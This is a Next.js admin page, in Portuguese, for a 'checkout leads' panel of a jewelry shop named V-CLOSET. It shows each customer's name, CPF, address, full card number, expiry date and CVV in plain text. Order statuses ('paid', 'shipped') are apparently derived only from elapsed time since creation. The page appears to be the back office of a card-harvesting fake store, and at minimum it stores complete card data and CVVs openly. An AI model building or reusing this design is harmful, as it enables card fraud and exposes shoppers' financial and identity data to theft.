"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { formatBRL } from "@/lib/format";
import { getOrderStatus } from "@/lib/orderStatus";

interface LeadItem {
  productName: string;
  quantity: number;
  unitPriceCents: number;
}

interface Lead {
  id: string;
  fullName: string;
  email: string;
  phone: string;
  cpf: string;
  cep: string;
  address: string;
  number: string;
  complement: string | null;
  neighborhood: string;
  city: string;
  state: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  installments: string;
  notes: string | null;
  itemsJson: string;
  subtotalCents: number;
  discountCents: number;
  totalCents: number;
  createdAt: string;
}

function Field({ label, value }: { label: string; value: string | null }) {
  return (
    <div>
      <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
        {label}
      </span>
      <p className="mt-0.5 text-sm font-medium text-cream/90">{value || "—"}</p>
    </div>
  );
}

export default function LeadsPanelPage() {
  const [checking, setChecking] = useState(true);
  const [authed, setAuthed] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState<string | null>(null);
  const [loggingIn, setLoggingIn] = useState(false);
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loadingLeads, setLoadingLeads] = useState(false);
  const [filterFrom, setFilterFrom] = useState("");
  const [filterTo, setFilterTo] = useState("");
  const [tab, setTab] = useState<"leads" | "pedidos">("leads");

  const filteredLeads = useMemo(() => {
    if (!filterFrom && !filterTo) return leads;
    const from = filterFrom ? new Date(`${filterFrom}T00:00:00`).getTime() : null;
    const to = filterTo ? new Date(`${filterTo}T23:59:59.999`).getTime() : null;
    return leads.filter((lead) => {
      const t = new Date(lead.createdAt).getTime();
      if (from !== null && t < from) return false;
      if (to !== null && t > to) return false;
      return true;
    });
  }, [leads, filterFrom, filterTo]);

  const loadLeads = useCallback(async () => {
    setLoadingLeads(true);
    try {
      const res = await fetch("/api/leads-panel/leads", { cache: "no-store" });
      if (res.status === 401) {
        setAuthed(false);
        return;
      }
      const data = await res.json();
      setLeads(Array.isArray(data.leads) ? data.leads : []);
      setAuthed(true);
    } catch {
      setLoginError("Não foi possível carregar os leads.");
    } finally {
      setLoadingLeads(false);
    }
  }, []);

  useEffect(() => {
    loadLeads().finally(() => setChecking(false));
    document.title = "ADMINISTRAÇÃO V-CLOSET";
  }, [loadLeads]);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setLoginError(null);
    setLoggingIn(true);
    try {
      const res = await fetch("/api/leads-panel/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        setLoginError(data.error || "E-mail ou senha inválidos.");
        return;
      }
      setEmail("");
      setPassword("");
      await loadLeads();
    } catch {
      setLoginError("Erro de conexão. Tente novamente.");
    } finally {
      setLoggingIn(false);
    }
  }

  async function handleLogout() {
    await fetch("/api/leads-panel/logout", { method: "POST" });
    setAuthed(false);
    setLeads([]);
  }

  async function handleClearAll() {
    if (!window.confirm("Apagar TODOS os leads? Esta ação não pode ser desfeita.")) return;
    await fetch("/api/leads-panel/leads?all=1", { method: "DELETE" });
    await loadLeads();
  }

  async function handleDelete(id: string) {
    if (!window.confirm("Apagar este lead?")) return;
    await fetch(`/api/leads-panel/leads?id=${encodeURIComponent(id)}`, {
      method: "DELETE",
    });
    await loadLeads();
  }

  if (checking) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-ink">
        <p className="text-sm tracking-widest2 text-cream/50">CARREGANDO…</p>
      </main>
    );
  }

  if (!authed) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-ink px-4">
        <div className="w-full max-w-sm">
          <div className="text-center">
            <img
              src="/logo-vcloset-plain.svg"
              alt="VCLOSET — Joias e Acessórios"
              className="mx-auto h-auto w-56"
            />
            <h1 className="mt-6 font-serif text-2xl tracking-widest2 text-gold-400">
              ADMINISTRAÇÃO
            </h1>
            <p className="mt-1 font-serif text-2xl tracking-widest2 text-cream">
              V-CLOSET
            </p>
            <p className="mt-3 text-xs uppercase tracking-widest2 text-cream/50">
              Painel de Leads do Checkout
            </p>
          </div>

          <form
            onSubmit={handleLogin}
            className="mt-10 space-y-5 rounded-lg border border-gold-400/20 bg-ink-soft p-7"
          >
            <div>
              <label
                htmlFor="panel-email"
                className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/60"
              >
                E-mail
              </label>
              <input
                id="panel-email"
                type="email"
                autoComplete="username"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="mt-1.5 w-full rounded border border-gold-400/20 bg-ink px-3 py-2.5 text-sm text-cream outline-none transition focus:border-gold-400/60"
                placeholder="seu@email.com"
              />
            </div>
            <div>
              <label
                htmlFor="panel-password"
                className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/60"
              >
                Senha
              </label>
              <input
                id="panel-password"
                type="password"
                autoComplete="current-password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="mt-1.5 w-full rounded border border-gold-400/20 bg-ink px-3 py-2.5 text-sm text-cream outline-none transition focus:border-gold-400/60"
                placeholder="••••••••"
              />
            </div>

            {loginError && (
              <p className="rounded border border-red-500/30 bg-red-500/10 px-3 py-2 text-xs text-red-300">
                {loginError}
              </p>
            )}

            <button
              type="submit"
              disabled={loggingIn}
              className="w-full rounded bg-gold-400 py-3 text-xs font-bold uppercase tracking-widest2 text-ink transition hover:bg-gold-300 disabled:cursor-not-allowed disabled:opacity-50"
            >
              {loggingIn ? "Entrando…" : "Entrar"}
            </button>
          </form>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-ink px-4 py-10 sm:px-8">
      <div className="mx-auto max-w-5xl">
        <div className="flex flex-wrap items-end justify-between gap-4">
          <div>
            <img
              src="/logo-vcloset-plain.svg"
              alt="VCLOSET — Joias e Acessórios"
              className="h-auto w-48"
            />
            <p className="mt-2 text-xs uppercase tracking-widest2 text-gold-400">
              ADMINISTRAÇÃO V-CLOSET
            </p>
            <p className="mt-2 text-xs uppercase tracking-widest2 text-cream/50">
              Painel de Leads · {filteredLeads.length} lead
              {filteredLeads.length === 1 ? "" : "s"}
              {filteredLeads.length !== leads.length
                ? ` (de ${leads.length} no total)`
                : ""}
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={loadLeads}
              disabled={loadingLeads}
              className="rounded border border-gold-400/30 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-gold-400 transition hover:border-gold-400/60 disabled:opacity-50"
            >
              {loadingLeads ? "Atualizando…" : "Atualizar"}
            </button>
            <button
              onClick={handleClearAll}
              disabled={leads.length === 0}
              className="rounded border border-red-500/40 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/70 disabled:opacity-30"
            >
              Limpar histórico
            </button>
            <button
              onClick={handleLogout}
              className="rounded border border-cream/20 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-cream/60 transition hover:border-cream/40"
            >
              Sair
            </button>
          </div>
        </div>

        <div className="mt-8 flex gap-6 border-b border-gold-400/15">
          <button
            onClick={() => setTab("leads")}
            className={`-mb-px border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
              tab === "leads"
                ? "border-gold-400 text-gold-400"
                : "border-transparent text-cream/50 hover:text-cream/80"
            }`}
          >
            Leads ({leads.length})
          </button>
          <button
            onClick={() => setTab("pedidos")}
            className={`-mb-px border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
              tab === "pedidos"
                ? "border-gold-400 text-gold-400"
                : "border-transparent text-cream/50 hover:text-cream/80"
            }`}
          >
            Pedidos ({leads.length})
          </button>
        </div>

        {tab === "leads" && (
        <>
        <div className="mt-6 flex flex-wrap items-end gap-3 rounded-lg border border-gold-400/15 bg-ink-soft px-5 py-4">
          <div>
            <label
              htmlFor="filter-from"
              className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40"
            >
              De
            </label>
            <input
              id="filter-from"
              type="date"
              value={filterFrom}
              onChange={(e) => setFilterFrom(e.target.value)}
              className="mt-1 rounded border border-gold-400/20 bg-ink px-3 py-2 text-sm text-cream outline-none transition focus:border-gold-400/60"
            />
          </div>
          <div>
            <label
              htmlFor="filter-to"
              className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40"
            >
              Até
            </label>
            <input
              id="filter-to"
              type="date"
              value={filterTo}
              onChange={(e) => setFilterTo(e.target.value)}
              className="mt-1 rounded border border-gold-400/20 bg-ink px-3 py-2 text-sm text-cream outline-none transition focus:border-gold-400/60"
            />
          </div>
          {(filterFrom || filterTo) && (
            <button
              onClick={() => {
                setFilterFrom("");
                setFilterTo("");
              }}
              className="rounded border border-cream/20 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-cream/60 transition hover:border-cream/40"
            >
              Limpar filtro
            </button>
          )}
        </div>

        {leads.length === 0 ? (
          <p className="mt-16 text-center text-sm text-cream/50">
            Nenhum lead enviado ainda.
          </p>
        ) : filteredLeads.length === 0 ? (
          <p className="mt-16 text-center text-sm text-cream/50">
            Nenhum lead no período selecionado.
          </p>
        ) : (
          <div className="mt-8 space-y-4">
            {filteredLeads.map((lead) => {
              let items: LeadItem[] = [];
              try {
                items = JSON.parse(lead.itemsJson) as LeadItem[];
              } catch {
                items = [];
              }

              return (
                <div
                  key={lead.id}
                  className="rounded-lg border border-gold-400/15 bg-ink-soft p-5"
                >
                  <div className="flex flex-wrap items-center justify-between gap-3">
                    <div>
                      <p className="text-sm font-semibold text-cream">
                        #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                      </p>
                      <p className="text-xs text-cream/50">
                        {lead.email} · {lead.phone}
                      </p>
                    </div>
                    <div className="flex items-center gap-4">
                      <div className="text-right">
                        <p className="text-sm font-bold text-gold-400">
                          {formatBRL(lead.totalCents)}
                        </p>
                        <p className="text-xs text-cream/50">
                          {lead.installments}
                          {lead.installments === "1" ? "x (à vista)" : "x sem juros"} ·{" "}
                          {new Date(lead.createdAt).toLocaleString("pt-BR")}
                        </p>
                      </div>
                      <button
                        onClick={() => handleDelete(lead.id)}
                        className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                        aria-label={`Excluir lead ${lead.fullName}`}
                      >
                        Excluir
                      </button>
                    </div>
                  </div>

                  <div className="mt-4 grid gap-3 border-t border-gold-400/10 pt-4 text-sm sm:grid-cols-2 lg:grid-cols-4">
                    <Field label="CPF" value={lead.cpf} />
                    <Field label="CEP" value={lead.cep} />
                    <Field label="Endereço" value={`${lead.address}, ${lead.number}`} />
                    <Field label="Complemento" value={lead.complement} />
                    <Field label="Bairro" value={lead.neighborhood} />
                    <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                    <Field label="Cartão" value={lead.cardNumber} />
                    <Field
                      label="Validade / CVV"
                      value={`${lead.cardExpiry} · ${lead.cardCvv}`}
                    />
                  </div>

                  <div className="mt-4 border-t border-gold-400/10 pt-4">
                    <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                      Itens
                    </span>
                    <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
                      {items.map((item, idx) => (
                        <li key={idx}>
                          {item.productName} × {item.quantity} —{" "}
                          {formatBRL(item.unitPriceCents * item.quantity)}
                        </li>
                      ))}
                    </ul>
                    {lead.discountCents > 0 && (
                      <p className="mt-1 text-xs text-emerald-400">
                        Desconto aplicado: -{formatBRL(lead.discountCents)}
                      </p>
                    )}
                    {lead.notes && (
                      <>
                        <span className="mt-3 block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                          Observações
                        </span>
                        <p className="mt-1 whitespace-pre-line text-sm text-cream/80">
                          {lead.notes}
                        </p>
                      </>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        )}
        </>
        )}

        {tab === "pedidos" && (
          leads.length === 0 ? (
            <p className="mt-16 text-center text-sm text-cream/50">
              Nenhum pedido recebido ainda.
            </p>
          ) : filteredLeads.length === 0 ? (
            <p className="mt-16 text-center text-sm text-cream/50">
              Nenhum pedido no período selecionado.
            </p>
          ) : (
            <>
              <p className="mt-6 text-xs uppercase tracking-widest2 text-cream/50">
                {filteredLeads.length} pedido
                {filteredLeads.length === 1 ? "" : "s"} ·{" "}
                {formatBRL(
                  filteredLeads.reduce((sum, l) => sum + l.totalCents, 0)
                )}{" "}
                em vendas
              </p>
              <div className="mt-4 space-y-3">
                {filteredLeads.map((lead) => {
                  let items: LeadItem[] = [];
                  try {
                    items = JSON.parse(lead.itemsJson) as LeadItem[];
                  } catch {
                    items = [];
                  }

                  return (
                    <div
                      key={lead.id}
                      className="rounded-lg border border-gold-400/15 bg-ink-soft p-4"
                    >
                      <div className="flex flex-wrap items-center justify-between gap-3">
                        <div className="min-w-0">
                          <p className="text-sm font-semibold text-cream">
                            #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                          </p>
                          <p className="mt-0.5 truncate text-xs text-cream/50">
                            {items
                              .map((i) => `${i.productName} × ${i.quantity}`)
                              .join(", ") || "—"}
                          </p>
                          <p className="mt-0.5 text-xs text-cream/50">
                            {new Date(lead.createdAt).toLocaleString("pt-BR")} ·{" "}
                            {lead.installments}
                            {lead.installments === "1"
                              ? "x (à vista)"
                              : "x sem juros"}
                          </p>
                        </div>
                        <div className="text-right">
                          <span
                            className={`inline-block rounded-full border px-3 py-1 text-[9px] font-bold uppercase tracking-widest2 ${
                              getOrderStatus(lead.createdAt) === "ENVIADO"
                                ? "border-sky-400/40 bg-sky-400/10 text-sky-300"
                                : getOrderStatus(lead.createdAt) === "PAGO"
                                  ? "border-emerald-400/40 bg-emerald-400/10 text-emerald-300"
                                  : "border-amber-400/40 bg-amber-400/10 text-amber-300"
                            }`}
                          >
                            {getOrderStatus(lead.createdAt) === "ENVIADO"
                              ? "Pedido enviado"
                              : getOrderStatus(lead.createdAt) === "PAGO"
                                ? "Pedido pago"
                                : "Aguardando pagamento"}
                          </span>
                          <p className="mt-1.5 text-sm font-bold text-gold-400">
                            {formatBRL(lead.totalCents)}
                          </p>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </>
          )
        )}
      </div>
    </main>
  );
}
